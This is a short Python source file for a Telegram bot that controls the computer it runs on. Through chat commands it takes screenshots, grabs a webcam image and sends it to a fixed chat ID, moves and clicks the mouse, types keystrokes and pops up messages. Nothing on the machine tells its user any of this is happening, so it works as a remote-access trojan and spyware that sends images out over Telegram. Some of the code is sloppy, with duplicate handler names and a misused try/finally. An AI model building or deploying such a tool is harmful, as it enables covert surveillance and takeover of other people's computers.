import pyautogui
import pyscreeze
import tkinter
import telebot
from tkinter import messagebox
from telebot import types
import cv2
import os

x=0
y=0
fl = 0
token=""

bot=telebot.TeleBot(token)



@bot.message_handler(commands=['status'])
def st(message):
    bot.send_message(message.chat.id,'.')

@bot.message_handler(commands=['screen'])
def screen(message):
    img = pyautogui.screenshot()
    bot.send_photo(message.chat.id, img)

@bot.message_handler(commands=['message'])
def mess(message):
    global fl
    fl = 1

@bot.message_handler(commands=['write'])
def wr(message):
    global fl
    fl = 2

@bot.message_handler(commands=['mouse'])
def mess(message):
    global fl
    fl = 3

@bot.message_handler(commands=['presskey'])
def mess(message):
    global fl
    fl = 6

@bot.message_handler(commands=['mousex'])
def mess(message):
    global fl
    fl = 4

@bot.message_handler(commands=['mousey'])
def mess(message):
    global fl
    fl = 5

@bot.message_handler(commands=['open'])
def mes11(message):
    global fl
    fl = 7

@bot.message_handler(commands=['photo'])
def mes12(message):
    try:
        cap = cv2.VideoCapture(0)
    finally:
        screen(message)
        ret, frame = cap.read()
        cv2.imwrite('captured_image.jpg', frame)
        with open('captured_image.jpg', 'rb') as photo:
            bot.send_photo(chat_id='CHAT_ID', photo=photo)
        os.remove('captured_image.jpg')
        cap.release()


@bot.message_handler()
def aaa(message):
    global fl
    global y
    global x
    if fl == 1:
     text = message.text
     messagebox.showerror('<0041>', text)
     fl = 0
     screen(message)
    if fl == 2:
     text = message.text
     pyautogui.write(text, interval=0.25)
     fl = 0
     screen(message)
    if fl == 3:
        text = message.text
        if text == "click":
             pyautogui.click()
             fl = 0
        elif text == "double":
            pyautogui.doubleClick()
            fl = 0
    if fl == 4:
        text = message.text
        x = int(text)
        pyautogui.moveTo(x, y)
        fl = 4
        screen(message)
    if fl == 5:
        text = message.text
        y = int(text)
        pyautogui.moveTo(x, y)
        screen(message)
    if fl == 6:
        try:
         text = message.text
         pyautogui.press(str(text))
        finally:
         screen(message)
    if fl == 7:
        text = message.text
        window = tkinter.Tk()
        window.title("<0041>")
        lbl = tkinter.Label(window, text = text, font=("Arial Bold", 50))
        lbl.grid(column=0, row=0)
        window.mainloop()
        fl = 0
        screen(message)
    else:
        screen(message)
bot.polling(none_stop=True)
